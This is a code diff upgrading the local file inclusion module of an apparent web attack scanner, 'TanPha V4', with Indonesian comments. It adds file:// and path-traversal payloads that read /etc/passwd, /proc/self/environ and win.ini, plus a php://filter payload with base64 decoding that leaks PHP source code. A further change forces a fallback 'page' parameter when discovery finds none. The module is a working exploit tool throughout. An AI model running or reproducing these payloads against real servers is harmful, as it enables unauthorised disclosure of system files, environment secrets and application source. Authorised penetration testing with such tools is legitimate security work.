@@ -1,72 +1,83 @@
-"""Local File Inclusion (LFI) Module for TanPha V3 (Global Multi-OS)."""
+"""Local File Inclusion (LFI) Module for TanPha V4 (Global Multi-OS + High Bypass)."""
 from modules.base import BaseModule
 from core.context import TargetContext, Evidence, Finding
 from core.verification import VerificationResult, VerificationStatus
 from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
 import re
+import base64
 
 
 class LFIModule(BaseModule):
     name = "LFI"
     module_id = "lfi"
-    version = "1.3 (Global God Tier)"
+    version = "2.2 (Global God Tier)"
     vulnerability_class = "LOCAL_FILE_INCLUSION"
     default_impact = "SENSITIVE_FILE_DISCLOSURE"
     default_privilege = "WEB_USER"
 
     _TARGET_FILES = [
+        # === V4.2 ADDED: FILE YANG HAMPIR PASTI ADA DI ANDROID/LINUX ===
         {
-            # GOD TIER: Read index.php source code in Base64
+            "path": "file:///etc/hosts",
+            "signatures": ["127.0.0.1", "localhost"],
+            "desc": "Linux /etc/hosts (High Bypass via file://)"
+        },
+        {
+            "path": "file:///proc/self/environ",
+            "signatures": ["PATH=", "USER=", "HOME="],
+            "desc": "Linux /proc/self/environ (High Bypass via file://)"
+        },
+        {
+            "path": "file:///etc/passwd",
+            "signatures": ["root:", "daemon:", "u0_a", ":/bin/"],
+            "desc": "Linux /etc/passwd (High Bypass via file://)"
+        },
+        {
+            "path": "file:///c:/windows/win.ini",
+            "signatures": ["[extensions]", "[fonts]"],
+            "desc": "Windows win.ini (High Bypass via file://)"
+        },
+        # === LOW / MEDIUM PAYLOADS ===
+        {
             "path": "php://filter/convert.base64-encode/resource=index.php",
-            "signatures": ["PD9waHA", "c2Vzc2lvbl9zdGFydA==", "PGh0bWw+"], # Base64 of <?php, session_start, <html>
+            "signatures": ["PD9waHA", "c2Vzc2lvbl9zdGFydA==", "PGh0bWw+"], 
             "desc": "PHP Filter Base64 (Index.php)"
         },
         {
-            # Linux /proc/version (always exists and readable)
-            "path": "../../../../../../../../proc/version",
-            "signatures": ["Linux version", "Android"],
-            "desc": "Linux /proc/version (Deep Path)"
+            "path": "../../../../../../../../etc/hosts",
+            "signatures": ["127.0.0.1", "localhost"],
+            "desc": "Linux /etc/hosts (Deep Path)"
         },
         {
             "path": "../../../../../../../../etc/passwd",
-            "signatures": ["root:x:0:0", "daemon:x:", "u0_a", ":/bin/bash", ":/sbin/nologin"],
+            "signatures": ["root:", "daemon:", "u0_a"],
             "desc": "Linux/Android /etc/passwd (Deep Path)"
         },
         {
             "path": "....//....//....//....//....//....//....//....//etc/passwd",
-            "signatures": ["root:x:0:0", "daemon:x:", "u0_a", ":/bin/bash", ":/sbin/nologin"],
+            "signatures": ["root:", "daemon:", "u0_a"],
             "desc": "Linux/Android /etc/passwd (Medium Bypass)"
-        },
-        {
-            "path": "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
-            "signatures": ["[extensions]", "[fonts]", "[mci extensions]"],
-            "desc": "Windows win.ini (Low)"
-        },
-        {
-            "path": "....\\\\....\\\\....\\\\....\\\\....\\\\....\\\\....\\\\....\\\\windows\\win.ini",
-            "signatures": ["[extensions]", "[fonts]", "[mci extensions]"],
-            "desc": "Windows win.ini (Medium Bypass)"
         }
     ]
 
     def can_run(self, context: TargetContext) -> bool:
-        return len(context.discovery.parameters) > 0
+        if not context.discovery.parameters:
+            print("      [!] Discovery failed. Forcing fallback parameter 'page' for LFI...")
+            context.discovery.parameters = ["page"]
+        return True
 
     def _build_target_url(self, base_url: str, param: str, payload: str) -> str:
         parsed = urlparse(base_url)
         qs = parse_qsl(parsed.query, keep_blank_values=True)
-        # FIX: Replace the parameter value (do not append)
         new_qs = [(k, payload) if k == param else (k, v) for k, v in qs]
+        if not new_qs:
+            new_qs = [(param, payload)]
         return urlunparse(parsed._replace(query=urlencode(new_qs, safe="")))
 
     def _send_payload(self, context, param, payload, scope_checker=None, timeout=10):
-        if "?" in context.target.base_url:
-            target_url = self._build_target_url(context.target.base_url, param, payload)
-            return context.http_client.request("GET", target_url, target_param=param, scope_checker=scope_checker, bypass_mutation=True, timeout=timeout)
-        else:
-            submit_field = "Submit"
-            data = {param: payload, submit_field: submit_field}
-            return context.http_client.request("POST", context.target.base_url, data=data, scope_checker=scope_checker, bypass_mutation=True, timeout=timeout)
+        # Paksa pakai GET karena LFI biasanya ?page=...
+        target_url = self._build_target_url(context.target.base_url, param, payload)
+        return context.http_client.request("GET", target_url, target_param=param, scope_checker=scope_checker, bypass_mutation=True, timeout=timeout)
 
     def assess(self, context: TargetContext, scope_checker=None) -> list[Evidence]:
         evidence_pool = []
@@ -126,7 +137,21 @@ class LFIModule(BaseModule):
         if result.success and result.response:
             print("\n--- File Content (First 500 bytes) ---")
             clean_text = re.sub(r'<[^>]+>', ' ', result.response.text)
-            print(clean_text[:500] + "...")
+            
+            if "php://filter" in finding.verify_payload:
+                b64_match = re.search(r'([A-Za-z0-9+/]{50,}={0,2})', clean_text)
+                if b64_match:
+                    try:
+                        decoded = base64.b64decode(b64_match.group(1)).decode('utf-8', errors='ignore')
+                        print("[*] Base64 Decoded Source Code:\n")
+                        print(decoded[:500] + "...\n")
+                    except Exception:
+                        print(clean_text[:500] + "...")
+                else:
+                    print(clean_text[:500] + "...")
+            else:
+                print(clean_text[:500] + "...")
+                
             print("--------------------------------------\n")
         else:
             print("[-] Failed to read file.")
